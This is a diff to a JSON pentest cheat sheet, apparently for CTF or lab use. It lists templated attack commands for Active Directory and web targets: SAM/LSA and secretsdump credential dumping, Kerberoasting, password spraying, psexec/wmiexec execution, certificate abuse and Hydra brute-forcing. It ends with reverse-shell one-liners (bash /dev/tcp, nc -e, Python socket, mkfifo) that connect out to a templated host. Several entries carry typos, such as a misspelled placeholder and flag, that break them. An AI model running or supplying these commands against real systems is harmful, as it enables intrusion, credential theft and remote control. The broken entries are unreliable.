@@ -1,35 +1,60 @@
 {
   "Active Directory": {
     "enumeration": [
+      "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv",
       "smbclient -L //{{IP}} -U {{USER}}",
-      "smbclient -L //{{IP}} -U {{USER}}",
-      "smbclient -L //{{IP}} -U {{USER}}",
-      "smbclient -L //{{IP}} -U {{USER}}",
-      "smbclient -L //{{IP}} -U {{USER}}",
-      "smbclient -L //{{IP}} -U {{USER}}",
-      "smbclient -L //{{IP}} -U {{USER}}",
-      "smbclient -L //{{IP}} -U {{USER}}",
-      "smbclient -L //{{IP}} -U {{USER}}",
-      "smbclient -L //{{IP}} -U {{USER}}",
-      "rpcclient -U {{USUARIO}} -P '{{CONTRASEÑA}}' -N {{IP}}"
+      "impacket-lookupsid {{DOMAIN}}/{{USER}}@{{IP}}",
+      "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --rid-brute",
+      "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --shares",
+      "netexec smb {{IP}} -u {{USER}} -p '{{PASSWORD}}' --pass-pol'",
+      "bloodhound-python -d {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}' -ns {{IP}} -c all",
+      "kerbrute userenum --dc {{IP}} -d {{DOMAIN}} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
+      "certipy-ad find -u {{USER}} -p '{{PASSWORD}}' -dn {{DOMAIN}} -dc-ip {{IP}} -vulnerable"
     ],
-    "exploitation":[
-      "certify"
+    "exploitation": [
+      "impacket-GetNPUsers {{DOMAIN}}/ -no-pass -usersfile users.txt -dc-ip {{IP}} -format john",
+      "evil-winrm -i {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}'",
+      "impacket-GetUserSPNs -dc-ip {{IP}} {{DOMAIN}}/{{USER}}:'{{PASSWORD}}' -request",
+      "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
+      "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --sam",
+      "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --lsa",
+      "netexec smb {{IP}} -u {{USER}} -p password.txt --continue-on-succes",
+      "python3 targetedKerberoast.py -v -d {{DOMAIN}} -u {{USER}} -p '{{PASSOWRD}}' --request-user TARGET_USER",
+      "impacket-psexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+      "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+      "impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+      "impacket-mssqlclient {{USER}}@{{IP}} -windows-auth",
+      "python3 gMSADumper.py -u {{USER}} -p '{{PASSWORD}}' -d {{DOMAIN}}",
+      "rlwrap -cAr nc -nlvp {{PORT}}",
+      "xfreerdp3 /u:{{USER}} /p:'{{PASSWORD}}' /v:{{IP}}"                              
     ],
-    "Ejemplo":[
-      "asdfa"
+    "post-exploitation": [
+      "impacket-reg {{DOMAIN}}/{{USER}}:{{PASSWORD}}@{{IP}} query -keyName HKLM\\SOFTWARE\\",
+      "certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip {{IP}}"
+      
     ]
   },
   "web": {
     "enumeration": [
-      "nikto -h http://{{IP}}",
-      "gobuster dir -u http://{{IP}} -w /usr/share/wordlists/dirb/common.txt"
+      "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv",
+      "dirsearch -u {{URL}} -e php,cgi,htm,html,md,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5,vuln --random-agent --recursive -R 3 -t 70 --exclude-status=404 --follow-redirects ",
+      "gobuster dir -u {{URL}} -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
+      "gobuster vhost -u {{URL}} --append-domain -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt",
+      "wpscan --url {{URL}} --disable-tls-checks --api-token 'YOUR_TOKEN' -e at -e ap -e u --plugins-detection aggressive",
+      "nuclei -u {{URL}}",
+      "nikto -h {{URL}}"
+    ],
+    "exploitation": [
+      "hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt ftp://{{IP}}",
+      "python3 git_dumper.py {{URL}} git_dump"
     ]
   },
   "revshell": {
     "shell": [
-      "bash -i >& /dev/tcp/{{IP}}/{{PUERTO}} 0>&1",
-      "nc -e /bin/bash {{IP}} {{PUERTO}}"
+      "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1",
+      "nc -e /bin/bash {{IP}} {{PORT}}",
+      "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{IP}}\",{{PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} {{PORT}} >/tmp/f"
     ]
   }
 }
